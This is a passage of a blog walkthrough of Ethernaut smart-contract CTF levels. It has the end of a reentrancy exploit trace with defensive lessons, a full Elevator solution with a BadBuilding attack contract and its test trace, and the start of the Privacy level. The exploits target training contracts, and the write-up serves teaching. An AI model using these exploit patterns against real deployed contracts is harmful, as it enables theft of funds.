</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>48897<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>48434<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>42334<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>41871<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>35771<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>35308<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>29208<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>28744<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>6724<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>6257<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>196<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>7068<span style="color:#728e00">]</span> 0xa2f9…f3a7::3ccfd60b<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> player::fallback<span style="color:#728e00">{</span>value: 110000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>3665<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Reentrance: <span style="color:#728e00">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>618<span style="color:#728e00">]</span> ReentranceFactory::validateInstance<span style="color:#728e00">(</span>Reentrance: <span style="color:#728e00">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span style="color:#728e00">]</span>, level: ReentranceFactory: <span style="color:#728e00">[</span>0xce71065d4017f316ec606fe4422e11eb2c47c246<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Lessons learned</p>
<p>Both of the major bugs that led to the
<a href="https://en.wikipedia.org/wiki/The_DAO_%28organization%29"  class="external-link" target="_blank" rel="noopener">DAO</a>
<a href="https://coinmarketcap.com/alexandria/article/a-history-of-the-dao-hack"  class="external-link" target="_blank" rel="noopener">hack</a>
were related to
<a href="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/"  class="external-link" target="_blank" rel="noopener">re-entrancy</a>
issues.
<a href="https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/"  class="external-link" target="_blank" rel="noopener">Here
is the great in-depth explanation of the DAO hack</a>, so be sure
to give it a read if you&rsquo;re interested to understand it deeper.</p>
<p>There are several ways to prevent these type of attacks:</p>
<ul>
<li>Always be aware that other contracts can interact with your
contract. Sending ETH is a regular function call, which can
call (re-enter) your contract.</li>
<li>Use the
<a href="https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html"  class="external-link" target="_blank" rel="noopener">Checks
Effects Interactions</a> pattern.</li>
<li>Adopt the
<a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard"  class="external-link" target="_blank" rel="noopener">OpenZeppelin&rsquo;s
ReentrancyGuard</a>. The
<a href="https://github.com/transmissions11/solmate"  class="external-link" target="_blank" rel="noopener">solmate</a> has
the
<a href="https://github.com/transmissions11/solmate/blob/main/src/utils/ReentrancyGuard.sol"  class="external-link" target="_blank" rel="noopener">ReentrancyGuard</a>
too.</li>
<li>Implement some kind of &ldquo;mutex&rdquo; yourself using the <code>lock</code> state variable.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy"  class="external-link" target="_blank" rel="noopener">Re-entrancy</a>
from Solidity docs (Security Considerations).</li>
<li><a href="https://dasp.co/#item-1"  class="external-link" target="_blank" rel="noopener">Re-entrancy attack</a> from the
Decentralized Application Security Project.</li>
<li><a href="https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html"  class="external-link" target="_blank" rel="noopener">Checks
Effects Interactions</a> from the Solidity Patterns.</li>
<li><a href="https://swcregistry.io/docs/SWC-107"  class="external-link" target="_blank" rel="noopener">SWC-107</a> from the
Smart Contract Weakness Classification and Test Cases.</li>
</ul>
<hr>
<p>This was another little write-up on the Ethernaut CTF.
Last but not least, the code and solution for this challenge is
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-11/src/test/Reentrancy.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.
Thank you for reading!</p>
<p>Let&rsquo;s explore the next level &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-12-elevator" >#12 Elevator</a> 🛗</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #12 Elevator</p>
<p>To solve this challenge we have to set the <code>top</code> state variable
to <code>true</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">interface</span> <span style="color:#434f54">Building</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">isLastFloor</span>(<span style="color:#00979d">uint256</span>) <span style="color:#728e00">external</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Elevator</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bool</span> <span style="color:#728e00">public</span> <span style="color:#434f54">top</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">floor</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">goTo</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">_floor</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">Building</span> <span style="color:#434f54">building</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Building</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">building</span>.<span style="color:#434f54">isLastFloor</span>(<span style="color:#434f54">_floor</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">floor</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_floor</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">top</span> <span style="color:#728e00">=</span> <span style="color:#434f54">building</span>.<span style="color:#434f54">isLastFloor</span>(<span style="color:#434f54">floor</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>Let&rsquo;s go over the <code>goTo</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">goTo</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">_floor</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Building</span> <span style="color:#434f54">building</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Building</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">building</span>.<span style="color:#434f54">isLastFloor</span>(<span style="color:#434f54">_floor</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">floor</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_floor</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">top</span> <span style="color:#728e00">=</span> <span style="color:#434f54">building</span>.<span style="color:#434f54">isLastFloor</span>(<span style="color:#434f54">floor</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ol>
<li>It casts the <code>msg.sender</code> to <code>Building</code>, which means that it
treats the <code>msg.sender</code> as a caller contract of the <code>goTo</code>
function.</li>
<li>Then it checks if we have not yet reached the top of our
building: <code>!building.isLastFloor(_floor)</code>.</li>
<li>Finally, it sets the <code>floor</code> and asks the instance of the
<code>building</code> contract if this is the last floor.</li>
</ol>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>We can implement the <code>Building</code> in any way we want. Let&rsquo;s make
the <code>isLastFloor</code> return <code>false</code> when it is called first time
and return <code>true</code> the second time. We&rsquo;ll have a boolean flag for
that:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">BadBuilding</span> <span style="color:#728e00">is</span> <span style="color:#434f54">Building</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bool</span> <span style="color:#728e00">private</span> <span style="color:#434f54">last</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Elevator</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">elevator</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">Elevator</span> <span style="color:#434f54">_elevator</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">last</span> <span style="color:#728e00">=</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">elevator</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_elevator</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">floor</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#434f54">elevator</span>.<span style="color:#434f54">goTo</span>(<span style="color:#434f54">floor</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">isLastFloor</span>(<span style="color:#00979d">uint256</span>) <span style="color:#728e00">external</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">last</span> <span style="color:#728e00">=</span> <span style="color:#728e00">!</span><span style="color:#434f54">last</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">last</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now any floor will be the last 😜</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">new</span> <span style="color:#434f54">BadBuilding</span>(<span style="color:#434f54">level</span>).<span style="color:#434f54">run</span>(<span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract ElevatorTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Elevator.t.sol:ElevatorTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testElevator<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 400437<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>400437<span style="color:#728e00">]</span> ElevatorTest::testElevator<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>197817<span style="color:#728e00">]</span> ElevatorTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>185469<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>ElevatorFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>133906<span style="color:#728e00">]</span> ElevatorFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>101347<span style="color:#728e00">]</span> → new Elevator@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">506</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Elevator: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: Elevator: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← Elevator: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← Elevator: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>91263<span style="color:#728e00">]</span> → new BadBuilding@<span style="color:#7f8c8d">&#34;0xa2f9…f3a7&#34;</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#8a7b52">344</span> bytes of code
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>37494<span style="color:#728e00">]</span> BadBuilding::run<span style="color:#728e00">(</span>0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>37018<span style="color:#728e00">]</span> Elevator::goTo<span style="color:#728e00">(</span>0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>396<span style="color:#728e00">]</span> BadBuilding::isLastFloor<span style="color:#728e00">(</span>0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">false</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>20394<span style="color:#728e00">]</span> BadBuilding::isLastFloor<span style="color:#728e00">(</span>0<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4292<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Elevator: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1245<span style="color:#728e00">]</span> ElevatorFactory::validateInstance<span style="color:#728e00">(</span>Elevator: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>332<span style="color:#728e00">]</span> Elevator::top<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: ElevatorFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#8a7b52">1</span> passed; <span style="color:#8a7b52">0</span> failed; finished in 990.96µs
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Lessons learned</p>
<p>Don&rsquo;t trust the world outside 😱</p>
<hr>
<p>Thanks for reading! We have completed another challenge and this
one wasn&rsquo;t that tricky 😏</p>
<p>The full code
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-12/src/test/Elevator.t.sol"  class="external-link" target="_blank" rel="noopener">is
here</a>.</p>
<p>Let&rsquo;s continue to the
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-13-privacy" >Ethernaut, #13 Privacy</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #13 Privacy</p>
<p><em>The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.</em></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Privacy</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bool</span> <span style="color:#728e00">public</span> <span style="color:#434f54">locked</span> <span style="color:#728e00">=</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">ID</span> <span style="color:#728e00">=</span> <span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint8</span> <span style="color:#728e00">private</span> <span style="color:#434f54">flattening</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint8</span> <span style="color:#728e00">private</span> <span style="color:#434f54">denomination</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">255</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint16</span> <span style="color:#728e00">private</span> <span style="color:#434f54">awkwardness</span> <span style="color:#728e00">=</span> <span style="color:#00979d">uint16</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes32</span>[<span style="color:#8a7b52">3</span>] <span style="color:#728e00">private</span> <span style="color:#728e00">data</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">bytes32</span>[<span style="color:#8a7b52">3</span>] <span style="color:#728e00">memory</span> <span style="color:#434f54">_data</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">data</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_data</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">unlock</span>(<span style="color:#00979d">bytes16</span> <span style="color:#434f54">_key</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">_key</span> <span style="color:#728e00">==</span> <span style="color:#00979d">bytes16</span>(<span style="color:#728e00">data</span>[<span style="color:#8a7b52">2</span>]));
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">locked</span> <span style="color:#728e00">=</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>    }
